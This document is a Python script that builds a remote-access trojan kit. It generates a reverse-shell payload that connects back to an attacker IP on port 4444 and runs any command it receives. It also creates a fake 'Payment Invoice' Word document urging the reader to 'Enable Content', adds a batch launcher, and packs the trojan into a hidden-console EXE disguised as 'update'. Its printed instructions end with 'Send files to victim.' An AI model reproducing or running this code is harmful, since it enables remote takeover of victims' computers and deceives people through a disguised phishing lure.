import os
import subprocess
import sys
from docx import Document
import socket
import shutil

def get_attacker_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "192.168.100.5"

def build_document():
    print("[*] Red Phantom Trojan Builder")
    print("="*50)
    
    current_dir = os.path.dirname(os.path.abspath(__file__))
    print(f"[*] Current directory: {current_dir}")
    
    # ✅ FIX: Correct output directory path
    output_dir = os.path.join(os.path.dirname(current_dir), "output_ready_to_send")
    output_dir = os.path.abspath(output_dir)
    
    print(f"[*] Output directory: {output_dir}")
    
    os.makedirs(output_dir, exist_ok=True)
    print(f"[+] Created output directory")
    
    attacker_ip = get_attacker_ip()
    print(f"[+] Using attacker IP: {attacker_ip}")
    
    trojan_path = os.path.join(current_dir, "trojan_reference.py")
    
    # ✅ FIX: Create trojan file if not exists
    if not os.path.exists(trojan_path):
        print(f"[-] Trojan file not found, creating default...")
        with open(trojan_path, 'w', encoding='utf-8') as f:
            f.write(f'''# Red Phantom Trojan
ATTACKER_IP = "{attacker_ip}"
ATTACKER_PORT = 4444

import socket
import subprocess
import os
import sys
import time

def connect():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))
        s.send(f"[+] {{socket.gethostname()}}@{{os.getlogin()}} connected\\n".encode())
        return s
    except:
        return None

def main():
    if sys.platform == "win32":
        import ctypes
        ctypes.windll.kernel32.SetConsoleMode(ctypes.windll.kernel32.GetStdHandle(-11), 7)

    s = None
    for _ in range(5):
        s = connect()
        if s: break
        time.sleep(2)

    if not s:
        return

    try:
        while True:
            cmd = s.recv(1024).decode().strip()
            if cmd == "exit":
                break
            elif cmd.startswith("cd "):
                try:
                    os.chdir(cmd[3:])
                    s.send(b"[+] Directory changed\\n")
                except Exception as e:
                    s.send(f"[-] {{e}}\\n".encode())
            else:
                try:
                    r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
                    s.send((r.stdout or r.stderr or "[+] Done\\n").encode())
                except:
                    s.send(b"[-] Command failed\\n")
    except:
        pass
    finally:
        s.close()

if __name__ == "__main__":
    main()
''')
        print(f"[+] Created default trojan file")
    
    # ✅ FIX: Update IP in trojan file
    print(f"[*] Found trojan file: {trojan_path}")
    
    with open(trojan_path, 'r', encoding='utf-8') as f:
        trojan_content = f.read()
    
    # Update both possible IP formats
    trojan_content = trojan_content.replace(
        'ATTACKER_IP = "192.168.100.5"',
        f'ATTACKER_IP = "{attacker_ip}"'
    )
    trojan_content = trojan_content.replace(
        'ATTACKER_IP = "192.168.0.4"',
        f'ATTACKER_IP = "{attacker_ip}"'
    )
    
    with open(trojan_path, 'w', encoding='utf-8') as f:
        f.write(trojan_content)
    
    print(f"[+] Trojan IP updated to: {attacker_ip}")
    
    # ✅ FIX: Copy trojan to output
    shutil.copy2(trojan_path, os.path.join(output_dir, "trojan.py"))
    print(f"[+] Copied trojan.py to output")
    
    print("\n[*] Creating Word document...")
    try:
        doc = Document()
        doc.add_heading('Payment Invoice - Dear Customer', 0)
        doc.add_paragraph(
            "Dear Sir/Madam,\n\n"
            "Please be advised that a final payment invoice for the amount of 1,250 EGP has been issued.\n"
            "For details, please click the 'Enable Content' button at the top of the page.\n\n"
            "Sincerely,\n"
            "Finance Department - Modern Technology Company"
        )
        doc_path = os.path.join(output_dir, "Payment_invoice.docm")
        doc.save(doc_path)
        print(f"[+] Created: Payment_invoice.docm")
    except Exception as e:
        print(f"[-] Error creating Word document: {str(e)}")
        # ✅ FIX: Continue even if document fails
    
    # ✅ FIX: Create batch file
    bat_content = f'''@echo off
echo Red Phantom Trojan
echo Target: {attacker_ip}
echo.
echo Starting trojan...
python trojan.py
pause
'''
    bat_file = os.path.join(output_dir, "run_trojan.bat")
    with open(bat_file, 'w') as f:
        f.write(bat_content)
    print(f"[+] Created: run_trojan.bat")
    
    print("\n[*] Building EXE with PyInstaller...")
    
    # ✅ FIX: Check if PyInstaller is installed first
    try:
        check_result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", "--version"],
            capture_output=True,
            text=True,
            timeout=5
        )
        pyinstaller_available = check_result.returncode == 0
    except:
        pyinstaller_available = False
    
    if not pyinstaller_available:
        print("[-] PyInstaller not installed, skipping EXE build")
        print("[*] Created Python version: trojan.py")
        print("[*] Created batch file: run_trojan.bat")
        
        # Create info file
        info_file = os.path.join(output_dir, "README.txt")
        with open(info_file, 'w') as f:
            f.write(f"""Red Phantom Trojan Files
=====================================
Target IP: {attacker_ip}
Port: 4444

Files:
- trojan.py: Python trojan (run with python trojan.py)
- run_trojan.bat: Batch file to run trojan
- Payment_invoice.docm: Word document (optional)

Instructions:
1. Run: python trojan.py (or double-click run_trojan.bat)
2. Start listener on port 4444
3. Connection will appear

To build EXE:
1. Install PyInstaller: pip install pyinstaller
2. Run: pyinstaller --onefile --noconsole --name update trojan_reference.py
""")
        print(f"[+] Created: README.txt")
        
        print("\n" + "="*50)
        print("[+] BUILD COMPLETE! (Python version)")
        print("="*50)
        print(f"\n[*] Files created in: {output_dir}")
        
        if os.path.exists(output_dir):
            files = os.listdir(output_dir)
            print(f"\n[*] Generated files ({len(files)} total):")
            for file in sorted(files):
                file_path = os.path.join(output_dir, file)
                if os.path.isfile(file_path):
                    size_kb = os.path.getsize(file_path) // 1024
                    print(f"  - {file} ({size_kb} KB)")
        
        return True
    
    # ✅ FIX: Clean temp directories
    temp_dirs = [
        os.path.join(current_dir, "build"),
        os.path.join(current_dir, "dist"),
        os.path.join(current_dir, "update.spec"),
    ]
    
    for temp_dir in temp_dirs:
        if os.path.exists(temp_dir):
            try:
                if os.path.isdir(temp_dir):
                    shutil.rmtree(temp_dir)
                else:
                    os.remove(temp_dir)
                print(f"[*] Cleaned: {temp_dir}")
            except:
                pass
    
    try:
        print("[*] Attempting to build EXE...")
        
        result = subprocess.run(
            [sys.executable, "-m", "PyInstaller", 
             "--onefile", "--noconsole", "--name", "update",
             trojan_path],
            cwd=current_dir,
            capture_output=True,
            text=True,
            timeout=120
        )
        
        if result.stdout:
            print(f"[*] PyInstaller output:\n{result.stdout[:500]}")
        
        if result.stderr:
            print(f"[-] PyInstaller errors:\n{result.stderr[:500]}")
        
        exe_src = os.path.join(current_dir, "dist", "update.exe")
        exe_dst = os.path.join(output_dir, "update.exe")
        
        if os.path.exists(exe_src):
            shutil.copy2(exe_src, exe_dst)
            print(f"[+] EXE created: update.exe")
            print(f"[*] EXE size: {os.path.getsize(exe_dst) // 1024} KB")
            
            # Clean temporary files
            try:
                for temp_dir in temp_dirs:
                    if os.path.exists(temp_dir):
                        if os.path.isdir(temp_dir):
                            shutil.rmtree(temp_dir)
                        else:
                            os.remove(temp_dir)
                print("[*] Cleaned temporary files")
            except:
                pass
            
        else:
            print("[-] EXE not created by PyInstaller")
            print("[*] Using Python version instead")
            
    except subprocess.TimeoutExpired:
        print("[-] PyInstaller timed out after 120 seconds")
        print("[*] Using Python version instead")
    except Exception as e:
        print(f"[-] Error building EXE: {str(e)}")
        print("[*] Using Python version instead")
    
    # ✅ FIX: Always ensure output files exist
    print("\n" + "="*50)
    print("[+] BUILD COMPLETE!")
    print("="*50)
    print(f"\n[*] Files created in: {output_dir}")
    
    if os.path.exists(output_dir):
        files = os.listdir(output_dir)
        print(f"\n[*] Generated files ({len(files)} total):")
        for file in sorted(files):
            file_path = os.path.join(output_dir, file)
            if os.path.isfile(file_path):
                size_kb = os.path.getsize(file_path) // 1024
                print(f"  - {file} ({size_kb} KB)")
    
    print("\n[*] Instructions:")
    print("1. Send files to victim")
    print("2. Start listener from dashboard")
    print("3. Victim runs the trojan")
    print("4. Connection will appear in dashboard")
    print("="*50)
    
    return True

if __name__ == "__main__":
    try:
        success = build_document()
        
        if success:
            print("\n[+] Trojan successfully built!")
            sys.exit(0)
        else:
            print("\n[-] Trojan build failed!")
            sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {str(e)}")
        import traceback
        traceback.print_exc()
        sys.exit(1)